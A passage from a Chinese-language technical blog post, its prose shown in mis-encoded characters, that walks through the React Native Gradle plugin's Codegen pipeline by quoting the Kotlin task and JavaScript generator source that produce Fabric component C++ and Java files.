    <span class="hljs-comment">// android { sourceSets { main { java { srcDirs += "$generatedSrcDir/java" } } } }</span>
    <span class="hljs-keyword">if</span> (isLibrary) {
      project.extensions.getByType(LibraryAndroidComponentsExtension::<span class="hljs-keyword">class</span>.java).finalizeDsl { ext
        -&gt;
        ext.sourceSets.getByName(<span class="hljs-string">"main"</span>).java.srcDir(generatedSrcDir.<span class="hljs-keyword">get</span>().dir(<span class="hljs-string">"java"</span>).asFile)
      }
    } <span class="hljs-keyword">else</span> {
      project.extensions.getByType(ApplicationAndroidComponentsExtension::<span class="hljs-keyword">class</span>.java).finalizeDsl {
          ext -&gt;
        ext.sourceSets.getByName(<span class="hljs-string">"main"</span>).java.srcDir(generatedSrcDir.<span class="hljs-keyword">get</span>().dir(<span class="hljs-string">"java"</span>).asFile)
      }
    }

    <span class="hljs-comment">// `preBuild` æ˜¯ AGP è‡ªåŠ¨æ³¨å†Œçš„åŸºç¡€ä»»åŠ¡ä¹‹ä¸€</span>
    <span class="hljs-comment">// è¿™å°†åœ¨ç¼–è¯‘æ•´ä¸ªé¡¹ç›®ä¹‹å‰è°ƒç”¨ Codegen</span>
    project.tasks.named(<span class="hljs-string">"preBuild"</span>, Task::<span class="hljs-keyword">class</span>.java).dependsOn(generateCodegenArtifactsTask)
  }
</code></pre>
<p><code>configureCodegen</code> æ˜¯ React Native Gradle æ’ä»¶çš„æ ¸å¿ƒæ–¹æ³•ï¼Œè´Ÿè´£é…ç½® <strong>Fabric/TurboModule æ–°æ¶æ„çš„ä»£ç ç”Ÿæˆï¼ˆCodegenï¼‰æµç¨‹</strong>ã€‚è¯¥æ–¹æ³•åœ¨ Gradle é…ç½®é˜¶æ®µæ‰§è¡Œï¼Œè®¾ç½®ä¸¤ä¸ªå…³é”®ä»»åŠ¡å’Œ Android æºç é›†é›†æˆã€‚</p>
<p>å…¶æµç¨‹å¯ä»¥åˆ†ä¸ºäº”ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li>
<p>è®¾ç½®è¾“å‡ºç›®å½•å’ŒÂ JS æ ¹ç›®å½•</p>
</li>
<li>
<p>åˆ›å»º Schema ç”Ÿæˆä»»åŠ¡</p>
</li>
<li>
<p>åˆ›å»ºä»£ç ç”Ÿæˆä»»åŠ¡</p>
</li>
<li>
<p>é›†æˆåˆ° Android æ„å»ºç³»ç»Ÿ</p>
</li>
<li>
<p>æŒ‚è½½åˆ°æ„å»ºç”Ÿå‘½å‘¨æœŸ</p>
</li>
</ol>
<p>è¿™é‡Œæ¦‚æ‹¬ä¸€ä¸‹æ•´ä¸ªæµç¨‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">1. Gradle é…ç½®é˜¶æ®µ
   â”œâ”€&gt; è®¾ç½® generatedSrcDir = <span class="hljs-string">"build/generated/source/codegen"</span>
   â”œâ”€&gt; è®¾ç½® jsRootDir é»˜è®¤å€¼ï¼ˆLibrary: <span class="hljs-string">"../"</span>, App: rootï¼‰
   â”œâ”€&gt; è¯»å– package.jsonï¼ˆé…ç½®é˜¶æ®µï¼‰
   â”‚   â”œâ”€&gt; æ£€æŸ¥ codegenConfig.jsSrcsDir
   â”‚   â””â”€&gt; æ£€æŸ¥ codegenConfig.includesGeneratedCode
   â”œâ”€&gt; æ³¨å†Œ generateCodegenSchemaTask
   â”‚   â”œâ”€&gt; é…ç½® Node.js ç¯å¢ƒ
   â”‚   â”œâ”€&gt; è®¾ç½® JS è¾“å…¥æ–‡ä»¶ï¼ˆ**/*.{js,jsx,ts,tsx}ï¼‰
   â”‚   â””â”€&gt; è®¾ç½® onlyIf æ¡ä»¶
   â”œâ”€&gt; æ³¨å†Œ generateCodegenArtifactsTask
   â”‚   â”œâ”€&gt; ä¾èµ– generateCodegenSchemaTask
   â”‚   â””â”€&gt; è®¾ç½® onlyIf æ¡ä»¶
   â”œâ”€&gt; é…ç½® Android SourceSets
   â”‚   â””â”€&gt; æ·»åŠ  generatedSrcDir/java åˆ° main SourceSet
   â””â”€&gt; å»ºç«‹ preBuild ä¾èµ–å…³ç³»

2. Gradle æ‰§è¡Œé˜¶æ®µï¼ˆè¿è¡Œ ./gradlew buildï¼‰
   â”œâ”€&gt; preBuild ä»»åŠ¡æ‰§è¡Œ
   â”‚   â””â”€&gt; generateCodegenArtifactsTask æ‰§è¡Œ
   â”‚         â”œâ”€&gt; generateCodegenSchemaTask æ‰§è¡Œ
   â”‚         â”‚     â”œâ”€&gt; æ‰«æ JS/TS æ–‡ä»¶
   â”‚         â”‚     â””â”€&gt; ç”Ÿæˆ schema.json
   â”‚         â””â”€&gt; æ ¹æ® schema.json ç”Ÿæˆ Java/C++ ä»£ç 
   â””â”€&gt; compileJava ç¼–è¯‘ç”Ÿæˆçš„ä»£ç 
</code></pre>
<p>è¿™é‡Œçš„ä¸¤ä¸ªå…³é”®ä»»åŠ¡åˆ†åˆ«æ˜¯<strong>generateCodegenSchemaFromJavaScript</strong>å’Œ<strong>generateCodegenArtifactsFromSchema</strong>ã€‚å‰è€…ä» JS/TS ç”Ÿæˆ Schema JSONæ–‡ä»¶ï¼Œåè€…ä» Schema ç”Ÿæˆ Java/C++ ä»£ç ã€‚</p>
<p>Schema JSONä¸»è¦æ˜¯JS/TSçš„æ¥å£æè¿°ï¼Œç”Ÿæˆè·¯å¾„æ˜¯<code>Your Project/node_modules/Third-party Lib/android/build/generated/source/codegen/schema.json</code>ï¼Œå¯ä»¥è‡ªè¡ŒæŸ¥çœ‹ï¼Œè¿™é‡Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨<code>generateCodegenArtifactsFromSchema</code>ï¼Œæºç <code>react-native/packages/gradle-plugin/react-native-gradle-plugin/src/main/kotlin/com/facebook/react/tasks/GenerateCodegenArtifactsTask.kt</code>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GenerateCodegenArtifactsTask</span> : <span class="hljs-type">Exec</span>() {
  <span class="hljs-meta">@get:Internal</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> reactNativeDir: DirectoryProperty
  <span class="hljs-meta">@get:Internal</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> generatedSrcDir: DirectoryProperty
  <span class="hljs-meta">@get:InputFile</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> packageJsonFile: RegularFileProperty   <span class="hljs-comment">// package.json æ–‡ä»¶è·¯å¾„</span>
  <span class="hljs-meta">@get:Input</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> nodeWorkingDir: Property&lt;String&gt;
  <span class="hljs-meta">@get:Input</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> nodeExecutableAndArgs: ListProperty&lt;String&gt;
  <span class="hljs-meta">@get:Input</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> codegenJavaPackageName: Property&lt;String&gt;
  <span class="hljs-meta">@get:Input</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> libraryName: Property&lt;String&gt;

  <span class="hljs-meta">@get:InputFile</span>
  <span class="hljs-keyword">val</span> generatedSchemaFile: Provider&lt;RegularFile&gt; = generatedSrcDir.file(<span class="hljs-string">"schema.json"</span>)

  <span class="hljs-meta">@get:OutputDirectory</span> <span class="hljs-keyword">val</span> generatedJavaFiles: Provider&lt;Directory&gt; = generatedSrcDir.dir(<span class="hljs-string">"java"</span>)
  <span class="hljs-meta">@get:OutputDirectory</span> <span class="hljs-keyword">val</span> generatedJniFiles: Provider&lt;Directory&gt; = generatedSrcDir.dir(<span class="hljs-string">"jni"</span>)

  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">exec</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> (resolvedLibraryName, resolvedCodegenJavaPackageName) = resolveTaskParameters()
    setupCommandLine(resolvedLibraryName, resolvedCodegenJavaPackageName)
    <span class="hljs-keyword">super</span>.exec()
  }

  <span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">resolveTaskParameters</span><span class="hljs-params">()</span></span>: Pair&lt;String, String&gt; {
    <span class="hljs-keyword">val</span> parsedPackageJson =
        <span class="hljs-keyword">if</span> (packageJsonFile.isPresent &amp;&amp; packageJsonFile.<span class="hljs-keyword">get</span>().asFile.exists()) {
          JsonUtils.fromPackageJson(packageJsonFile.<span class="hljs-keyword">get</span>().asFile)
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-literal">null</span>
        }
    <span class="hljs-keyword">val</span> resolvedLibraryName = parsedPackageJson?.codegenConfig?.name ?: libraryName.<span class="hljs-keyword">get</span>()
    <span class="hljs-keyword">val</span> resolvedCodegenJavaPackageName =
        parsedPackageJson?.codegenConfig?.android?.javaPackageName ?: codegenJavaPackageName.<span class="hljs-keyword">get</span>()
    <span class="hljs-keyword">return</span> resolvedLibraryName to resolvedCodegenJavaPackageName
  }

  <span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">setupCommandLine</span><span class="hljs-params">(libraryName: <span class="hljs-type">String</span>, codegenJavaPackageName: <span class="hljs-type">String</span>)</span></span> {
    <span class="hljs-keyword">val</span> workingDir = File(nodeWorkingDir.<span class="hljs-keyword">get</span>())
    commandLine(
        windowsAwareCommandLine(
            *nodeExecutableAndArgs.<span class="hljs-keyword">get</span>().toTypedArray(),
            reactNativeDir.file(<span class="hljs-string">"scripts/generate-specs-cli.js"</span>).<span class="hljs-keyword">get</span>().asFile.cliPath(workingDir),
            <span class="hljs-string">"--platform"</span>,
            <span class="hljs-string">"android"</span>,
            <span class="hljs-string">"--schemaPath"</span>,
            generatedSchemaFile.<span class="hljs-keyword">get</span>().asFile.cliPath(workingDir),
            <span class="hljs-string">"--outputDir"</span>,
            generatedSrcDir.<span class="hljs-keyword">get</span>().asFile.cliPath(workingDir),
            <span class="hljs-string">"--libraryName"</span>,
            libraryName,
            <span class="hljs-string">"--javaPackageName"</span>,
            codegenJavaPackageName,
        )
    )
  }
}
</code></pre>
<p>è¯¥ç±»ä¸»è¦ç”¨äºæ‰§è¡Œå¤–éƒ¨ Node.js å‘½ä»¤ï¼Œä¾æ® <code>schema.json</code>æ–‡ä»¶ï¼Œç”Ÿæˆ Java/JNI ä»£ç ã€‚éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œè¿™é‡Œ<code>libraryName</code>å’Œ<code>codegenJavaPackageName</code>çš„å–å€¼ï¼Œä»£ç ä¸­æ˜¯é€šè¿‡<code>resolveTaskParameters</code>æ–¹æ³•æå–å‡ºæ¥çš„ã€‚å›é¡¾ä¸€ä¸‹package.jsonæ–‡ä»¶çš„é…ç½®ï¼Œå¤§æ¦‚æ˜¯ä»¥ä¸‹ç»“æ„ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"codegenConfig"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"MyLibrary"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"android"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"javaPackageName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"com.example.mylibrary"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>é‚£ä¹ˆ<code>libraryName</code>å°±æ˜¯<code>"MyLibrary"</code>ï¼Œ<code>codegenJavaPackageName</code>å°±æ˜¯<code>"com.example.mylibrary"</code>ã€‚</p>
<p>ç°åœ¨å†è¿˜åŸä¸€ä¸‹å‘½ä»¤ï¼Œå…¶å®å°±æ˜¯ä»¥ä¸‹å½¢å¼ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">node &lt;reactNativeDir&gt;/scripts/generate-specs-cli.js \
  --platform android \
  --schemaPath &lt;generatedSrcDir&gt;/schema.json \
  --outputDir &lt;generatedSrcDir&gt; \
  --libraryName &lt;resolvedLibraryName&gt; \
  --javaPackageName &lt;resolvedCodegenJavaPackageName&gt;
</code></pre>
<p>æˆ‘ä»¬å®šä½åˆ°è¯¥jsæ–‡ä»¶<code>react-native/packages/react-native/scripts/generate-specs-cli.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> executor = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./codegen/generate-specs-cli-executor'</span>);
<span class="hljs-comment">// çœç•¥......</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  executor.<span class="hljs-title function_">execute</span>(
    <span class="hljs-comment">// $FlowFixMe[prop-missing]</span>
    argv.<span class="hljs-property">platform</span>,
    <span class="hljs-comment">// $FlowFixMe[prop-missing]</span>
    argv.<span class="hljs-property">schemaPath</span>,
    <span class="hljs-comment">// $FlowFixMe[prop-missing]</span>
    argv.<span class="hljs-property">outputDir</span>,
    <span class="hljs-comment">// $FlowFixMe[prop-missing]</span>
    argv.<span class="hljs-property">libraryName</span>,
    <span class="hljs-comment">// $FlowFixMe[prop-missing]</span>
    argv.<span class="hljs-property">javaPackageName</span>,
    <span class="hljs-comment">// $FlowFixMe[prop-missing]</span>
    argv.<span class="hljs-property">libraryType</span>,
  );
}

<span class="hljs-title function_">main</span>();
</code></pre>
<p>ç»§ç»­è·Ÿè¸ª<code>react-native/packages/react-native/scripts/codegen/generate-specs-cli-executor.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./codegen-utils'</span>);

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">GENERATORS</span> <span class="hljs-comment">/*: {[string]: {[string]: $ReadOnlyArray&lt;string&gt;}} */</span> = {
  <span class="hljs-attr">all</span>: {
    <span class="hljs-attr">android</span>: [<span class="hljs-string">'componentsAndroid'</span>, <span class="hljs-string">'modulesAndroid'</span>, <span class="hljs-string">'modulesCxx'</span>],
    <span class="hljs-attr">ios</span>: [<span class="hljs-string">'componentsIOS'</span>, <span class="hljs-string">'modulesIOS'</span>, <span class="hljs-string">'modulesCxx'</span>],
  },
  <span class="hljs-attr">components</span>: {
    <span class="hljs-attr">android</span>: [<span class="hljs-string">'componentsAndroid'</span>],
    <span class="hljs-attr">ios</span>: [<span class="hljs-string">'componentsIOS'</span>],
  },
  <span class="hljs-attr">modules</span>: {
    <span class="hljs-attr">android</span>: [<span class="hljs-string">'modulesAndroid'</span>, <span class="hljs-string">'modulesCxx'</span>],
    <span class="hljs-attr">ios</span>: [<span class="hljs-string">'modulesIOS'</span>, <span class="hljs-string">'modulesCxx'</span>],
  },
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">generateSpecFromInMemorySchema</span>(<span class="hljs-params">
  platform <span class="hljs-comment">/*: string */</span>,
  schema <span class="hljs-comment">/*: string */</span>,
  outputDirectory <span class="hljs-comment">/*: string */</span>,
  libraryName <span class="hljs-comment">/*: string */</span>,
  packageName <span class="hljs-comment">/*: string */</span>,
  libraryType <span class="hljs-comment">/*: string */</span>,
  useLocalIncludePaths <span class="hljs-comment">/*: boolean */</span>,
</span>) {
  <span class="hljs-title function_">validateLibraryType</span>(libraryType);
  <span class="hljs-title function_">createOutputDirectoryIfNeeded</span>(outputDirectory, libraryName);
  <span class="hljs-keyword">const</span> includeGetDebugPropsImplementation =
    libraryName.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'FBReactNativeSpec'</span>); <span class="hljs-comment">//only generate getDebugString for React Native Core Components</span>
  utils.<span class="hljs-title function_">getCodegen</span>().<span class="hljs-title function_">generate</span>(
    {
      libraryName,
      schema,
      outputDirectory,
      packageName,
      <span class="hljs-attr">assumeNonnull</span>: platform === <span class="hljs-string">'ios'</span>,
      useLocalIncludePaths,
      includeGetDebugPropsImplementation,
    },
    {
      <span class="hljs-attr">generators</span>: <span class="hljs-variable constant_">GENERATORS</span>[libraryType][platform],
    },
  );

  <span class="hljs-keyword">if</span> (platform === <span class="hljs-string">'android'</span>) {
    <span class="hljs-comment">// Move all components C++ files to a structured jni folder for now.</span>
    <span class="hljs-comment">// Note: this should've been done by RNCodegen's generators, but:</span>
    <span class="hljs-comment">// * the generators don't support platform option yet</span>
    <span class="hljs-comment">// * this subdir structure is Android-only, not applicable to iOS</span>
    <span class="hljs-keyword">const</span> files = fs.<span class="hljs-title function_">readdirSync</span>(outputDirectory);
    <span class="hljs-keyword">const</span> jniOutputDirectory = <span class="hljs-string">`<span class="hljs-subst">${outputDirectory}</span>/jni/react/renderer/components/<span class="hljs-subst">${libraryName}</span>`</span>;
    fs.<span class="hljs-title function_">mkdirSync</span>(jniOutputDirectory, {<span class="hljs-attr">recursive</span>: <span class="hljs-literal">true</span>});
    files
      .<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">f</span> =&gt;</span> f.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.h'</span>) || f.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.cpp'</span>))
      .<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">f</span> =&gt;</span> {
        fs.<span class="hljs-title function_">renameSync</span>(<span class="hljs-string">`<span class="hljs-subst">${outputDirectory}</span>/<span class="hljs-subst">${f}</span>`</span>, <span class="hljs-string">`<span class="hljs-subst">${jniOutputDirectory}</span>/<span class="hljs-subst">${f}</span>`</span>);
      });
  }
}
</code></pre>
<p>è¿™é‡Œæ ¸å¿ƒæ˜¯è°ƒç”¨<code>utils.getCodegen().generate</code>æ¥æ‰§è¡Œä»£ç ç”Ÿæˆé€»è¾‘ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªä¼ å‚éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œ<code>generators: GENERATORS[libraryType][platform],</code>æˆ‘ä»¬è§‚å¯Ÿ<strong>GENERATORS</strong>çš„å®šä¹‰å°±ä¼šå‘ç°ï¼Œè¿™é‡Œçš„å‚æ•°é…ç½®æ­£å¥½å¯¹åº”package.jsonä¸­çš„codegené…ç½®ï¼Œç”±äºæˆ‘ä»¬ç°åœ¨ç ”ç©¶çš„æ˜¯Fabricç»„ä»¶æ³¨å†Œï¼Œé‚£ä¹ˆè¿™é‡Œçš„å‚æ•°åº”è¯¥æ˜¯<code>componentsAndroid</code>ã€‚</p>
<p>ç»§ç»­æŸ¥æ‰¾<code>generate</code>æ–¹æ³•çš„å®ç°ï¼Œæºç <code>react-native/packages/react-native/scripts/codegen/codegen-utils.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
* ç”¨äºæŠ½è±¡å®é™…ä»£ç ç”Ÿæˆè¿‡ç¨‹çš„åŒ…è£…å™¨ã€‚ 
* ä¹‹æ‰€ä»¥éœ€è¦è¿™ä¸ªåŒ…è£…å™¨ï¼Œæ˜¯å› ä¸ºåœ¨ Sandcastle ä¸­è¿è¡Œæµ‹è¯•æ—¶ï¼Œå¹¶éæ‰€æœ‰ç¯å¢ƒéƒ½åƒé€šå¸¸é‚£æ ·è®¾ç½®ã€‚ 
* ä¾‹å¦‚ï¼Œ`<span class="hljs-doctag">@react</span>-native/codegen` åº“å°±ä¸å­˜åœ¨ã€‚ 
*
* å€ŸåŠ©è¿™ä¸ªåŒ…è£…å™¨ï¼Œæˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿä»£ç ç”Ÿæˆå™¨çš„ getter æ–¹æ³•ï¼Œä½¿å…¶è¿”å›ä¸€ä¸ªè‡ªå®šä¹‰å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ¨¡æ‹Ÿäº† Codegen æ¥å£ã€‚ 
*
* <span class="hljs-doctag">@return</span> ä¸€ä¸ªå¯ä»¥ä¸ºæ–°æ¶æ„ç”Ÿæˆä»£ç çš„å¯¹è±¡ã€‚ 
*/</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getCodegen</span>(<span class="hljs-params"/>) <span class="hljs-comment">/*: $FlowFixMe */</span> {
  <span class="hljs-keyword">let</span> <span class="hljs-title class_">RNCodegen</span>;
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// $FlowFixMe[cannot-resolve-module]</span>
    <span class="hljs-title class_">RNCodegen</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../../packages/react-native-codegen/lib/generators/RNCodegen.js'</span>);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-comment">// $FlowFixMe[cannot-resolve-module]</span>
    <span class="hljs-title class_">RNCodegen</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@react-native/codegen/lib/generators/RNCodegen.js'</span>);
  }
  <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">RNCodegen</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'RNCodegen not found.'</span>);
  }
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">RNCodegen</span>;
}
</code></pre>
<p>ç»§ç»­è·Ÿè¸ª<code>react-native/packages/react-native-codegen/lib/generators/RNCodegen.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LIBRARY_GENERATORS</span> = {
  <span class="hljs-attr">descriptors</span>: [
    generateComponentDescriptorCpp.<span class="hljs-property">generate</span>,
    generateComponentDescriptorH.<span class="hljs-property">generate</span>,
  ],
  <span class="hljs-attr">events</span>: [generateEventEmitterCpp.<span class="hljs-property">generate</span>, generateEventEmitterH.<span class="hljs-property">generate</span>],
  <span class="hljs-attr">states</span>: [generateStateCpp.<span class="hljs-property">generate</span>, generateStateH.<span class="hljs-property">generate</span>],
  <span class="hljs-attr">props</span>: [
    generateComponentHObjCpp.<span class="hljs-property">generate</span>,
    generatePropsCpp.<span class="hljs-property">generate</span>,
    generatePropsH.<span class="hljs-property">generate</span>,
    generatePropsJavaInterface.<span class="hljs-property">generate</span>,
    generatePropsJavaDelegate.<span class="hljs-property">generate</span>,
  ],
  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Refactor this to consolidate various C++ output variation instead of forking per platform.</span>
  <span class="hljs-attr">componentsAndroid</span>: [
    <span class="hljs-comment">// JNI/C++ files</span>
    generateComponentDescriptorH.<span class="hljs-property">generate</span>,
    generateComponentDescriptorCpp.<span class="hljs-property">generate</span>,
    generateEventEmitterCpp.<span class="hljs-property">generate</span>,
    generateEventEmitterH.<span class="hljs-property">generate</span>,
    generatePropsCpp.<span class="hljs-property">generate</span>,
    generatePropsH.<span class="hljs-property">generate</span>,
    generateStateCpp.<span class="hljs-property">generate</span>,
    generateStateH.<span class="hljs-property">generate</span>,
    generateShadowNodeCpp.<span class="hljs-property">generate</span>,
    generateShadowNodeH.<span class="hljs-property">generate</span>,
    <span class="hljs-comment">// Java files</span>
    generatePropsJavaInterface.<span class="hljs-property">generate</span>,
    generatePropsJavaDelegate.<span class="hljs-property">generate</span>,
  ],
  <span class="hljs-attr">componentsIOS</span>: [
    generateComponentDescriptorH.<span class="hljs-property">generate</span>,
    generateComponentDescriptorCpp.<span class="hljs-property">generate</span>,
    generateEventEmitterCpp.<span class="hljs-property">generate</span>,
    generateEventEmitterH.<span class="hljs-property">generate</span>,
    generateComponentHObjCpp.<span class="hljs-property">generate</span>,
    generatePropsCpp.<span class="hljs-property">generate</span>,
    generatePropsH.<span class="hljs-property">generate</span>,
    generateStateCpp.<span class="hljs-property">generate</span>,
    generateStateH.<span class="hljs-property">generate</span>,
    generateShadowNodeCpp.<span class="hljs-property">generate</span>,
    generateShadowNodeH.<span class="hljs-property">generate</span>,
  ],
  <span class="hljs-attr">modulesAndroid</span>: [
    generateModuleJniCpp.<span class="hljs-property">generate</span>,
    generateModuleJniH.<span class="hljs-property">generate</span>,
    generateModuleJavaSpec.<span class="hljs-property">generate</span>,
  ],
  <span class="hljs-attr">modulesCxx</span>: [generateModuleH.<span class="hljs-property">generate</span>],
  <span class="hljs-attr">modulesIOS</span>: [generateModuleObjCpp.<span class="hljs-property">generate</span>],
  <span class="hljs-attr">tests</span>: [generateTests.<span class="hljs-property">generate</span>],
  <span class="hljs-string">'shadow-nodes'</span>: [
    generateShadowNodeCpp.<span class="hljs-property">generate</span>,
    generateShadowNodeH.<span class="hljs-property">generate</span>,
  ],
};


<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">allGenerators</span>: <span class="hljs-variable constant_">ALL_GENERATORS</span>,
  <span class="hljs-title function_">generate</span>(<span class="hljs-params">
    {
      libraryName,
      schema,
      outputDirectory,
      packageName,
      assumeNonnull,
      useLocalIncludePaths,
      includeGetDebugPropsImplementation = <span class="hljs-literal">false</span>,
      libraryGenerators = LIBRARY_GENERATORS,
    },
    {generators, test},
  </span>) {
    schemaValidator.<span class="hljs-title function_">validate</span>(schema);
    <span class="hljs-keyword">const</span> defaultHeaderPrefix = <span class="hljs-string">'react/renderer/components'</span>;
    <span class="hljs-keyword">const</span> headerPrefix =
      useLocalIncludePaths === <span class="hljs-literal">true</span>
        ? <span class="hljs-string">''</span>
        : <span class="hljs-string">`<span class="hljs-subst">${defaultHeaderPrefix}</span>/<span class="hljs-subst">${libraryName}</span>/`</span>;
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">composePath</span>(<span class="hljs-params">intermediate</span>) {
      <span class="hljs-keyword">return</span> path.<span class="hljs-title function_">join</span>(outputDirectory, intermediate, libraryName);
    }
    <span class="hljs-keyword">const</span> componentIOSOutput = <span class="hljs-title function_">composePath</span>(
      useLocalIncludePaths === <span class="hljs-literal">true</span> ? <span class="hljs-string">''</span> : defaultHeaderPrefix,
    );
    <span class="hljs-keyword">const</span> modulesIOSOutput = <span class="hljs-title function_">composePath</span>(<span class="hljs-string">'./'</span>);
    <span class="hljs-keyword">const</span> outputFoldersForGenerators = {
      <span class="hljs-attr">componentsIOS</span>: componentIOSOutput,
      <span class="hljs-attr">modulesIOS</span>: modulesIOSOutput,
      <span class="hljs-attr">descriptors</span>: outputDirectory,
      <span class="hljs-attr">events</span>: outputDirectory,
      <span class="hljs-attr">props</span>: outputDirectory,
      <span class="hljs-attr">states</span>: outputDirectory,
      <span class="hljs-attr">componentsAndroid</span>: outputDirectory,
      <span class="hljs-attr">modulesAndroid</span>: outputDirectory,
      <span class="hljs-attr">modulesCxx</span>: outputDirectory,
      <span class="hljs-attr">tests</span>: outputDirectory,
      <span class="hljs-string">'shadow-nodes'</span>: outputDirectory,
    };
    <span class="hljs-keyword">const</span> generatedFiles = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> name <span class="hljs-keyword">of</span> generators) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> generator <span class="hljs-keyword">of</span> libraryGenerators[name]) {
        <span class="hljs-title function_">generator</span>(
          libraryName,
          schema,
          packageName,
          assumeNonnull,
          headerPrefix,
          includeGetDebugPropsImplementation,
        ).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">contents, fileName</span>) =&gt;</span> {
          generatedFiles.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">name</span>: fileName,
            <span class="hljs-attr">content</span>: contents,
            <span class="hljs-attr">outputDir</span>: outputFoldersForGenerators[name],
          });
        });
      }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">checkOrWriteFiles</span>(generatedFiles, test);
  },
  <span class="hljs-comment">// çœç•¥......</span>
};
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œ<code>for (const name of generators)</code>éå†çš„<strong>generators</strong>å°±æ˜¯æˆ‘ä»¬å‰é¢å¼ºè°ƒè¿‡çš„<strong>GENERATORS</strong>å‚æ•°å¤„ç†ã€‚é‚£ä¹ˆæ­¤æ—¶<code>name</code>çš„å€¼å°±æ˜¯<code>componentsAndroid</code>ã€‚</p>
<p>æ—¢ç„¶ç¡®å®šäº†å‚æ•°ï¼Œé‚£ä¹ˆä»<code>libraryGenerators</code>ä¸­éå†å‡ºæ¥çš„<code>generator</code>å°±æ˜¯ä»¥ä¸‹è¿™äº›ç”Ÿæˆå™¨ï¼š</p>
<pre><code class="hljs language-js" lang="js">  <span class="hljs-attr">componentsAndroid</span>: [
    <span class="hljs-comment">// JNI/C++ files</span>
    generateComponentDescriptorH.<span class="hljs-property">generate</span>,
    generateComponentDescriptorCpp.<span class="hljs-property">generate</span>,
    generateEventEmitterCpp.<span class="hljs-property">generate</span>,
    generateEventEmitterH.<span class="hljs-property">generate</span>,
    generatePropsCpp.<span class="hljs-property">generate</span>,
    generatePropsH.<span class="hljs-property">generate</span>,
    generateStateCpp.<span class="hljs-property">generate</span>,
    generateStateH.<span class="hljs-property">generate</span>,
    generateShadowNodeCpp.<span class="hljs-property">generate</span>,
    generateShadowNodeH.<span class="hljs-property">generate</span>,
    <span class="hljs-comment">// Java files</span>
    generatePropsJavaInterface.<span class="hljs-property">generate</span>,
    generatePropsJavaDelegate.<span class="hljs-property">generate</span>,
  ],
</code></pre>
<p>è¿™é‡Œå…ˆç ”ç©¶ä¸€ä¸‹<code>generateComponentDescriptorH.generate</code>å’Œ<code>generateComponentDescriptorCpp.generate</code>ã€‚</p>
<p>æºç <code>react-native/packages/react-native-codegen/src/generators/components/GenerateComponentDescriptorH.js</code>ï¼š</p>
